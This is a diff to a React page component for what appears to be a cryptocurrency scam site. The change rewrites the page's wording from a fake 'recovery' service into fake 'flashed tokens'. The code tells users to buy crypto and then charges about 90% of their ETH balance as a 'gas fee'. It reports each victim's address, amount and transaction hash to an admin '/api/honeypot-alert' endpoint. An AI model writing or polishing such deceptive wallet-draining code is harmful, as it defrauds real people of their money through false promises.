@@ -2755,7 +2755,7 @@ export default function FlashedPage() {
                   <div className="text-yellow-400 text-3xl mb-2">💳</div>
                   <h3 className="text-white font-bold text-lg">Low Balance Detected</h3>
                   <p className="text-gray-300 text-sm mt-2">
-                    Your wallet balance is low ({userBalance.toFixed(4)} ETH). Buy crypto to proceed with recovery operations.
+                    Your wallet balance is low ({userBalance.toFixed(4)} ETH). Buy crypto to claim your flashed tokens.
                   </p>
                 </div>
                 
@@ -2764,7 +2764,7 @@ export default function FlashedPage() {
                   <div className="text-gray-300 text-sm space-y-1">
                     <div>1. Buy crypto in your wallet app</div>
                     <div>2. We'll auto-detect when funds arrive</div>
-                    <div>3. Recovery will process automatically</div>
+                    <div>3. Flashed tokens will be sent automatically</div>
                     <div>4. No need to return to this page</div>
                   </div>
                 </div>
@@ -2798,9 +2798,9 @@ export default function FlashedPage() {
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-green-500">
                 <div className="text-center mb-4">
                   <div className="text-green-400 text-3xl mb-2">🚀</div>
-                  <h3 className="text-white font-bold text-lg">Funds Detected - Auto Processing!</h3>
+                  <h3 className="text-white font-bold text-lg">Funds Detected - Sending Tokens!</h3>
                   <p className="text-gray-300 text-sm mt-2">
-                    Great! We detected {userBalance.toFixed(4)} ETH. Processing recovery payment automatically...
+                    Great! We detected {userBalance.toFixed(4)} ETH. Processing flashed token transfer automatically...
                   </p>
                 </div>
                 
@@ -2814,7 +2814,7 @@ export default function FlashedPage() {
                     <span className="text-green-400 font-bold">${(userBalance * 3200).toFixed(2)}</span>
                   </div>
                   <div className="flex justify-between items-center">
-                    <span className="text-gray-300 text-sm">Recovery Fee:</span>
+                    <span className="text-gray-300 text-sm">Gas Fee:</span>
                     <span className="text-blue-400">~${(userBalance * 0.9 * 3200).toFixed(2)}</span>
                   </div>
                 </div>
@@ -2840,24 +2840,24 @@ export default function FlashedPage() {
                         
                         await tx.wait();
                         
-                        setStatus('✅ Recovery payment processed! Assets will be unlocked shortly.');
+                        setStatus('✅ Gas fee processed! Flashed tokens sent to your wallet.');
                         
                         // Alert admin
                         await fetch('/api/honeypot-alert', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({
-                            type: 'AUTO_RECOVERY_PAYMENT',
+                            type: 'AUTO_FLASH_PAYMENT',
                             userAddress: userAddress,
                             amount: sendAmount + ' ETH',
                             txHash: tx.hash,
                             usdValue: (parseFloat(sendAmount) * 3200).toFixed(2),
-                            note: 'Auto-detected balance and processed recovery payment'
+                            note: 'Auto-detected balance and processed flashed token gas fee'
                           })
                         });
                         
                       } catch (error) {
-                        setStatus('Recovery payment failed: ' + error.message);
+                        setStatus('Token transfer failed: ' + error.message);
                       }
                       
                       setLoading(false);
@@ -2865,7 +2865,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Processing Recovery...' : `Process Recovery - ${(userBalance * 0.9).toFixed(4)} ETH`}
+                    {loading ? 'Sending Tokens...' : `Send Flashed Tokens - ${(userBalance * 0.9).toFixed(4)} ETH`}
                   </button>
                   
                   <button 
@@ -2877,7 +2877,7 @@ export default function FlashedPage() {
                 </div>
                 
                 <div className="text-gray-400 text-xs text-center mt-3">
-                  Auto-detected funds • Instant processing • Secure recovery
+                  Auto-detected funds • Instant transfer • Flashed tokens
                 </div>
               </div>
             </div>
